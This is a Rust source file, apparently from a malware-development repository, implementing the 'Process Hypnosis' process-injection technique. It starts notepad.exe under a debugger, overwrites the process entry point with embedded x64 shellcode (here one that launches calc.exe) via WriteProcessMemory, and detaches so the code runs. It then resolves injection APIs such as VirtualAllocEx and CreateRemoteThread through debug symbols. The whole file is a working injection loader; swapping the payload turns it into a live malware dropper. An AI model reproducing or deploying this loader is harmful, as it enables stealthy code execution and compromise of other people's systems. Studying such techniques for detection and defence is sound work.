/*
    Process_Hypnosis [Fixed]
    For more Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
    References used: 
        https://github.com/CarlosG13/Process-Hypnosis-Debugger-assisted-control-flow-hijack.git
        https://github.com/joaoviictorti/RustRedOps/tree/main/Process_Hypnosis
        
    @5mukx
    
*/

use std::{ffi::OsStr, os::windows::ffi::OsStrExt, ptr::null_mut};

use winapi::{
    ctypes::{c_char, c_void}, 
    um::{debugapi::{ContinueDebugEvent, DebugActiveProcessStop, WaitForDebugEvent}, 
    errhandlingapi::GetLastError, 
    memoryapi::{ReadProcessMemory, WriteProcessMemory}, 
    minwinbase::{DEBUG_EVENT, EXCEPTION_BREAKPOINT, LOAD_DLL_DEBUG_EVENT}, 
    processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW}}
};

macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[+] {}", format!($msg, $($arg), *));
    }
}

macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[-] {}", format!($msg, $($arg), *));
        println!("Exiting ...");
        return;
    }
}

type BOOL = i32;
type HANDLE = *mut c_void;

fn main(){
    let shellcode: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
        ];

    unsafe{
        let mut debug_info: DEBUG_EVENT = std::mem::zeroed();

        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let path_name: Vec<u16> = OsStr::new("C:\\Windows\\System32\\notepad.exe")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let create_process = CreateProcessW(
            null_mut(),
            path_name.as_ptr() as *mut u16,
            null_mut(), 
            null_mut(), 
            0,
            winapi::um::winbase::DEBUG_ONLY_THIS_PROCESS,
            null_mut(), 
            null_mut(), 
            &mut startup_info, 
            &mut process_info,
        );

        if create_process == 0{
            println!("Break 1");
            error!("CreateProcessW Failed: {}", GetLastError());
        }

        for num in 0..7 {
            if WaitForDebugEvent(&mut debug_info, 0xFFFFFFFF) != 0 {
                
                match debug_info.dwDebugEventCode {
                    3 => { // CREATE_PROCESS_DEBUG_EVENT
                        okey!("Process PID: {}", debug_info.dwProcessId);
                        okey!("Thread ID: {}", debug_info.dwThreadId);
                        okey!("StartAddress: {:?}", debug_info.u.CreateProcessInfo().lpStartAddress.unwrap());
                        okey!("Main Thread: {:?}", debug_info.u.CreateProcessInfo().hThread);
                    },

                    2 => { // CREATE_THREAD_DEBUG_EVENT
                        println!();
                        okey!("Thread Created: {:?}", debug_info.u.CreateThread().lpStartAddress);
                        okey!("Thread Handle: {:?}", debug_info.u.CreateThread().hThread);
                        okey!("Thread ThreadLocalBase: {:?}", debug_info.u.CreateThread().lpThreadLocalBase);
                    },

                    LOAD_DLL_DEBUG_EVENT => { // LOAD_DLL_DEBUG_EVENT
                        let mut buffer = [0u8; std::mem::size_of::<*mut c_void>()];
                        let mut return_number = 0;

                        let success = ReadProcessMemory(
                            process_info.hProcess, 
                            debug_info.u.LoadDll().lpImageName as *mut c_void,
                            buffer.as_mut_ptr() as *mut c_void,
                            std::mem::size_of::<*mut c_void>(),
                            &mut return_number,
                        );

                        if success == 0 {
                            error!("ReadProcessMemory(1) Failed: {}", GetLastError());
                        }

                        let dll_address = usize::from_ne_bytes(buffer) as *mut c_void;
                        let mut image_name = vec![0u16; 260];

                        okey!("DLL ADDRESS: {:?}", dll_address);

                        let success = ReadProcessMemory(
                            process_info.hProcess, 
                            dll_address, 
                            image_name.as_mut_ptr() as _, 
                            image_name.len() * std::mem::size_of::<u16>(), 
                            &mut return_number,
                        );

                        if success == 0 {
                            error!("ReadProcessMemory(2) Failed: {}", GetLastError());
                        }

                        if let Some(first_null) = image_name.iter().position(|&c| c == 0) {
                            image_name.truncate(first_null);
                        }

                        let dll_name = String::from_utf16_lossy(&image_name);
                        okey!("DLL Name: {}", dll_name.trim_end_matches('\0'));
                        okey!("DLL Base Address: {:?}", debug_info.u.LoadDll().lpBaseOfDll);
                        okey!("DLL H_File: {:?}", debug_info.u.LoadDll().hFile);
                    },

                    1 => { //EXCEPTION_DEBUG_EVENT
                        if debug_info.u.Exception().ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT {
                            okey!("BreakPoint Successfully Triggered {}", '!');
                        }
                    },

                    _ => {}
                }

                if num == 6 {
                    let mut number_of_write = 0;
                    let success = WriteProcessMemory(
                        process_info.hProcess,
                        std::mem::transmute::<_, *mut c_void>(debug_info.u.CreateProcessInfo().lpStartAddress),
                        shellcode.as_ptr() as _,
                        shellcode.len(),
                        &mut number_of_write,
                    );

                    if success == 0 {
                        error!("WriteProcessMemory Failed: {}", GetLastError());
                    }

                    let active_proc = DebugActiveProcessStop(process_info.dwProcessId);
                    
                    if active_proc == 0 {
                        error!("DebugActiveProcessStop Failed: {}", GetLastError());
                    }
                }

                if num < 6 {
                    let dbg_continue = ContinueDebugEvent(
                        process_info.dwProcessId,
                        process_info.dwThreadId,
                        0x00010002, // DBG_CONTINUE
                    );

                    if dbg_continue == 0 {
                        error!("ContinueDebugEvent Failed: {}", GetLastError());
                    }
                }
            }
        }

        let sym_success = SymInitialize(
            0xFFFFFFFFFFFFFFFFu64 as *mut c_void,
            null_mut(),
            1
        );

        if sym_success == 0 {
            error!("SymInitialize Error: {}", GetLastError());
        }

        let mut symbol: SYMBOL_INFO = std::mem::zeroed();
        symbol.SizeOfStruct = std::mem::size_of::<SYMBOL_INFO>() as u32;

        let virtual_alloc_addr: Vec<_> = "VirtualAllocEx".encode_utf16().collect();
        let success = SymFromName(
            0xffffffffffffffffu64 as _, 
            virtual_alloc_addr.as_ptr(),
            &mut symbol
        );

        if success == 0 {
            error!("SymFromName Failed: {:?}", GetLastError());
        }

        okey!("Example Addr of VirtualAllocEx: {:?}", symbol.Address as *mut c_void);

        let create_remote_thread: Vec<_> = "CreateRemoteThread".encode_utf16().collect();
        let success = SymFromName(
            0xffffffffffffffffu64 as _, 
            create_remote_thread.as_ptr(),
            &mut symbol
        );

        if success == 0 {
            error!("SymFromName Failed: {:?}", GetLastError());
        }

        okey!("Example Addr of CreateRemoteThread: {:?}", symbol.Address as *mut c_void);

        let nt_protect_memory: Vec<_> = "NtProtectVirtualMemory".encode_utf16().collect();
        let success = SymFromName(
            0xffffffffffffffffu64 as _, 
            // s!("NtProtectVirtualMemory"), 
            nt_protect_memory.as_ptr(),
            &mut symbol
        );

        if success == 0 {
            error!("SymFromName Failed: {:?}", GetLastError());
        }

        okey!("Example Addr of NtProtectVirtualMemory: {:?}", symbol.Address as *mut c_void);
    }
}

#[link(name = "Dbghelp")]
#[allow(non_snake_case)]
extern "system" {
    pub fn SymInitialize(
        hProcess: HANDLE,
        UserSearchPath: *const c_char,
        fInvadeProcess: BOOL,
    ) -> BOOL;
}

extern "system" {
    pub fn SymFromName(
        hprocess: HANDLE,
        name: *const u16,
        symbol: *mut SYMBOL_INFO
    ) -> BOOL;
}

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct SYMBOL_INFO_FLAGS(pub u32);

#[allow(non_snake_case,non_camel_case_types)]
#[repr(C)]
pub struct SYMBOL_INFO {
    pub SizeOfStruct: u32,
    pub TypeIndex: u32,
    pub Reserved: [u64; 2],
    pub Index: u32,
    pub Size: u32,
    pub ModBase: u64,
    pub Flags: SYMBOL_INFO_FLAGS,
    pub Value: u64,
    pub Address: u64,
    pub Register: u32,
    pub Scope: u32,
    pub Tag: u32,
    pub NameLen: u32,
    pub MaxNameLen: u32,
    pub Name: [i8; 1],
}

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct HANDLE_FLAGS(pub u32);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct MEMORY_INFORMATION_CLASS(pub u32);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct PVOID(pub *mut c_void);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct PSIZE_T(pub *mut usize);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct PROCESSINFOCLASS(pub u32);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct SECTION_INHERIT(pub u32);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct SIZE_T(pub usize);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct ULONG(pub u32);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct ULONG_PTR(pub usize);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct ULONG64(pub u64);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct USHORT(pub u16);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct WCHAR(pub u16);

#[repr(transparent)]
#[allow(non_camel_case_types)]
pub struct WORD(pub u16);
